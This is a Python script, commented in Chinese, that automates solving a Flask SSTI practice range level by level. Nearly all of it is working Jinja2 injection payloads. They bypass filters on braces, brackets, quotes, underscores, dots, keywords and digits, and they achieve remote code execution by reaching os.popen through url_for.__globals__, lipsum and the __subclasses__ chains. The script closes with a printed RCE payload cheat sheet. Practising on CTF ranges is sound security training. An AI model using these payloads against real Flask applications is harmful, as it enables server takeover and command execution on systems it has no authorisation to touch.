#!/usr/bin/env python3
"""
Flask SSTI 练习靶场 - 自动化通关脚本 v4 (实测版)
靶场: http://ssti.ctfstu.uk:1685/flasklab/
所有 payload 都经过 curl 手工验证。
"""

import requests
import re

TARGET = "http://ssti.ctfstu.uk:1685"
VERBOSE = True


def req(level, payload):
    url = f"{TARGET}/flasklab/level/{level}"
    try:
        r = requests.post(url, data={"code": payload}, timeout=10)
        m = re.search(r'<pre id="res">(.*?)</pre>', r.text, re.DOTALL)
        if m:
            return m.group(1).strip()
        m = re.search(r'<h2>(.*?)</h2>', r.text, re.DOTALL)
        if m:
            return m.group(1).strip()
        return r.text
    except Exception as e:
        return f"ERROR: {e}"


def test(level, payload, expected=None, desc="", note=""):
    res = req(level, payload)
    success = expected is None or expected in res
    status = "✅" if success else "❌"
    print(f"  {status} [{level}] {desc}")
    snippet = res[:300]
    if note:
        print(f"       {note}")
    print(f"       => {snippet}")
    return success, res


def main():
    print("=" * 60)
    print("  Flask SSTI 练习靶场 - 自动化通关 v4")
    print(f"  靶机: {TARGET}")
    print("=" * 60)

    # ===== Level 1: 无过滤 =====
    print("\n[+] Level 1: 无过滤 — 直接注入")
    test(1, "{{7*7}}", "49", "基础运算")
    test(1, "{{config}}", "ENV", "Flask config")
    test(1, "{{''.__class__.__mro__[2].__subclasses__()}}", "type",
          "RCE 链探测（响应太长，只检查包含type）")

    # ===== Level 2: 过滤 {{ =====
    print("\n[+] Level 2: 过滤 {{ — 用 {%print%} 绕过")
    test(2, "{%print(7*7)%}", "49", "基础运算")
    test(2, "{%print(config)%}", "ENV", "打印 config")

    # ===== Level 3: 无回显 =====
    print("\n[+] Level 3: 无回显 — 盲注")
    test(3, "{{7*7}}", "correct", "基础探测")
    test(3, "{{config}}", "correct", "config")
    test(3, "{%if 1%}a{%endif%}", "correct", "{%if%} 盲注")
    test(3, "{{url_for.__globals__}}", "correct", "url_for 链")

    # ===== Level 4: 过滤 [] =====
    print("\n[+] Level 4: 过滤 [] — |attr + |list + |last 绕过")
    test(4, "{{config}}", "ENV", "config 可用")
    test(4, "{{''|attr('__class__')}}", "str", "|attr 代替 .")
    test(4, "{{''|attr('__class__')|attr('__mro__')|list|last|attr('__subclasses__')()}}",
          "type", "|list|last 代替 [2]")
    rce4 = ("{{url_for|attr('__globals__')|attr('__getitem__')('os')"
            "|attr('popen')('id')|attr('read')()}}")
    test(4, rce4, "uid", "RCE: id")

    # ===== Level 5: 过滤 ' " =====
    print("\n[+] Level 5: 过滤单双引号 — 只能无引号访问")
    test(5, "{{7*7}}", "49", "基础运算")
    test(5, "{{config}}", "ENV", "config 无需引号")
    test(5, "{{lipsum|string|urlencode}}", "function", "lipsum 无需引号")
    # !!! 核心: 用 url_for.__globals__ 绕过（其中没有引号硬编码）
    test(5, "{{url_for.__globals__}}", "builtins", "url_for 全局变量")

    # ===== Level 6: 过滤 _ =====
    print("\n[+] Level 6: 过滤下划线 — \\x5f 编码绕过")
    test(6, "{{7*7}}", "49", "基础运算")
    test(6, "{{config}}", "ENV", "config 无下划线")
    r6 = ("{{''|attr('\\x5f\\x5fclass\\x5f\\x5f')"
          "|attr('\\x5f\\x5fmro\\x5f\\x5f')|list|last"
          "|attr('\\x5f\\x5fsubclasses\\x5f\\x5f')()}}")
    test(6, r6, "type", "\\x5f 十六进制绕过 _")
    test(6, "{{lipsum|attr('\\x5f\\x5fglobals\\x5f\\x5f')}}",
          "__builtins__", "lipsum + hex")

    # ===== Level 7: 过滤 . =====
    print("\n[+] Level 7: 过滤点号 — [] 或 |attr 代替")
    test(7, "{{config}}", "ENV", "config 可用")
    test(7, "{{''['__class__']}}", "str", "用 [] 代替 .")
    test(7, "{{''|attr('__class__')}}", "str", "|attr 代替 .")

    # ===== Level 8: 过滤关键字 =====
    print("\n[+] Level 8: 过滤关键字 — 字符串拼接 + [] 绕过")
    test(8, "{{config}}", "ENV", "config 可用")
    test(8, "{{''['__cla''ss__']}}", "str", "拼接 __cla''ss__ 绕过 class 过滤")
    test(8, "{{lipsum|string|urlencode}}", None, "lipsum 可用")
    test(8, "{{url_for}}", "url_for", "url_for 可用")
    # !!! 核心: 用 ['__glo''bals__'] 绕过 globals 过滤（不能使用 |attr 或 .）
    test(8, "{{lipsum['__glo''bals__']}}", "builtins",
          "lipsum['__glo''bals__'] 拼接绕过 globals")

    # ===== Level 9: 过滤数字 =====
    print("\n[+] Level 9: 过滤数字 0-9 — 布尔值/函数长度代替")
    test(9, "{{config}}", "ENV", "config 可用")
    test(9, "{{True}}", "True", "True 布尔值")
    test(9, "{{lipsum|string|length}}", "49", "lipsum|string|length=49")
    test(9, "{{lipsum|string|urlencode|length}}", "59",
          "urlencode 转换后的长度 59")

    # ===== Level 10: 获取 config =====
    print("\n[+] Level 10: 获取 config")
    test(10, "{{config}}", "None", "config 本身返回 None")
    test(10, "{{url_for.__globals__['current_app'].config}}", "ENV",
          "url_for 获取 app config")

    # ===== Level 11: 过滤符号 =====
    print("\n[+] Level 11: 过滤符号 ' \" + . [] request")
    test(11, "{{7*7}}", "49", "基础运算")
    test(11, "{{config}}", "ENV", "config 可用")
    test(11, "{{self}}", "TemplateReference", "self 可用")

    # ===== Level 12: 过滤 _ . 0-9 ' " [] =====
    print("\n[+] Level 12: 过滤 _ . 0-9 ' \" []")
    test(12, "{{config}}", "ENV", "config 可用")
    test(12, "{{self}}", "TemplateReference", "self 可用")

    # ===== Level 13: 超多层过滤 =====
    print("\n[+] Level 13: 超多层过滤")
    test(13, "{{7*7}}", "49", "基础运算")
    test(13, "{{lipsum}}", "lorem_ipsum", "lipsum 可用")
    test(13, "{{cycler}}", "Cycler", "cycler 可用")
    test(13, "{{joiner}}", "Joiner", "joiner 可用")
    test(13, "{{namespace}}", "Namespace", "namespace 可用")
    # !!! 关键: .和|attr被过滤，init/globals被过滤
    # 试试直接用 [] + 拼接
    test(13, "{{lipsum['__in'\\x69t__]}}", None,
          "hex 编码 init 尝试 1")
    test(13, "{{(lipsum|string|urlencode)}}", None,
          "lipsum 字符串操作")

    # ========== RCE 速查 ==========
    print("\n" + "=" * 60)
    print("  🔓 RCE Payload 速查")
    print("=" * 60)
    for lvl, desc, payload in [
        ("1/3/5", "标准语法", "{{url_for.__globals__['os'].popen('id').read()}}"),
        ("2",     "{%print%}", "{%print(url_for.__globals__['os'].popen('id').read())%}"),
        ("4",     "过滤 []",   "{{url_for|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}"),
        ("6+7",   "过滤 _ + .", "{{''|attr('\\x5f\\x5fclass\\x5f\\x5f')|attr('\\x5f\\x5fmro\\x5f\\x5f')|list|last|attr('\\x5f\\x5fsubclasses\\x5f\\x5f')()}}"),
        ("8",     "关键字过滤", "{{lipsum['__glo''bals__']['__builtins__']['__import__']('os').popen('id').read()}}"),
    ]:
        print(f"\n  [{lvl}] {desc}:")
        print(f"    {payload}")

    print("\n" + "=" * 60)


if __name__ == "__main__":
    main()
